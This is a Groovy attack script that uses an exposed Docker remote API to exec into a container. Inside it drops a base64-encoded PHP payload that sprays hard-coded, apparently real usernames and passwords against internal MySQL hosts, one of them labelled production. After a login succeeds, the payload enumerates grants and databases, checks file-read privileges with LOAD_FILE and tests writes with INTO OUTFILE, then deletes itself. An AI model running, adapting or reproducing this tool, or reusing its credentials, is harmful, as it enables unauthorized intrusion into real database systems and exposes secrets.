// Phase 2: Auth matrix - try all cred combos against reachable MySQL + SSH
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "===== AUTH MATRIX: ALL CREDS x ALL REACHABLE HOSTS =====\\n\\n";

$creds = array(
    array("apifincadob",    "nNzy]Ku2Ah=u%y1I"),
    array("apifincadodev",  "nNzy]Ku2Ah=u%y1I"),
    array("app_t1",         "wUt22Us2CUh#+M="),
    array("root",           ""),
    array("root",           "nNzy]Ku2Ah=u%y1I"),
    array("root",           "wUt22Us2CUh#+M="),
    array("jenkins",        "e6LBqIkOI\\$PR1XX2oia"),
    array("admin",          "nNzy]Ku2Ah=u%y1I"),
);

$hosts = array(
    array("DEV_SEARS",  "172.27.141.6",  3308),
    array("T1PAGOS",    "172.27.141.4",  3306),
    array("PROD_SEARS", "172.27.141.24", 3308),
);

foreach ($hosts as $h) {
    list($label, $host, $port) = $h;
    echo "--- HOST: $label ($host:$port) ---\\n";
    
    // First check TCP
    $fp = @fsockopen($host, $port, $en, $es, 3);
    if (!$fp) {
        echo "  TCP_UNREACHABLE: $en $es\\n\\n";
        continue;
    }
    fclose($fp);
    echo "  TCP_OPEN\\n";
    
    foreach ($creds as $c) {
        list($user, $pass) = $c;
        $dsn = "mysql:host=$host;port=$port";
        try {
            $pdo = new PDO($dsn, $user, $pass, array(
                PDO::ATTR_TIMEOUT => 5,
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
            ));
            echo "  *** AUTH_OK *** | $user | $pass\\n";
            
            // Full enum on successful auth
            foreach ($pdo->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn, @@port pt") as $r) {
                echo "    VER=".$r["v"]." CU=".$r["cu"]." HN=".$r["hn"]." PT=".$r["pt"]."\\n";
            }
            
            // Grants
            echo "    GRANTS:\\n";
            foreach ($pdo->query("SHOW GRANTS FOR CURRENT_USER()") as $r) {
                echo "      ".$r[0]."\\n";
            }
            
            // Databases
            echo "    DATABASES:\\n";
            foreach ($pdo->query("SHOW DATABASES") as $r) {
                echo "      ".$r[0]."\\n";
            }
            
            // Key variables
            foreach ($pdo->query("SELECT @@secure_file_priv sfp, @@datadir dd, @@plugin_dir pd") as $r) {
                echo "    SECURE_FILE_PRIV=".$r["sfp"]."\\n";
                echo "    DATADIR=".$r["dd"]."\\n";
                echo "    PLUGIN_DIR=".$r["pd"]."\\n";
            }
            
            // FILE test
            $res = $pdo->query("SELECT LOAD_FILE('/etc/hostname') h");
            $row = $res->fetch();
            if ($row["h"]) {
                echo "    FILE_PRIV=YES (hostname: ".trim($row["h"]).")\\n";
            } else {
                echo "    FILE_PRIV=NO_OR_RESTRICTED\\n";
            }
            
            // OUTFILE test
            $rnd = mt_rand(1000,9999);
            try {
                $pdo->exec("SELECT 'test' INTO OUTFILE '/tmp/t_$rnd.txt'");
                echo "    OUTFILE=/tmp OK\\n";
            } catch (Exception $e2) {
                echo "    OUTFILE=/tmp FAIL: ".$e2->getMessage()."\\n";
            }
            
            echo "\\n";
            break; // got access, stop trying more creds for this host
            
        } catch (Exception $e) {
            $msg = $e->getMessage();
            if (strpos($msg, "Access denied") !== false) {
                echo "  AUTH_FAIL | $user | (access denied)\\n";
            } else {
                echo "  CONN_ERR | $user | $msg\\n";
                break; // host unreachable, skip remaining creds
            }
        }
    }
    echo "\\n";
}

// Extra: try T1Pagos on port 3310 too (was refused before, confirm)
echo "===== T1PAGOS PORT 3310 RECHECK =====\\n";
$fp = @fsockopen("172.27.141.4", 3310, $en, $es, 3);
if ($fp) { echo "TCP_OPEN 172.27.141.4:3310\\n"; fclose($fp); }
else { echo "TCP_CLOSED 172.27.141.4:3310 | $en | $es\\n"; }

echo "\\nAUTH_MATRIX_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_auth.php && php /tmp/_auth.php 2>&1; rm -f /tmp/_auth.php"

println "########## AUTH MATRIX PHASE 2 ##########"
println execIn(cmd)
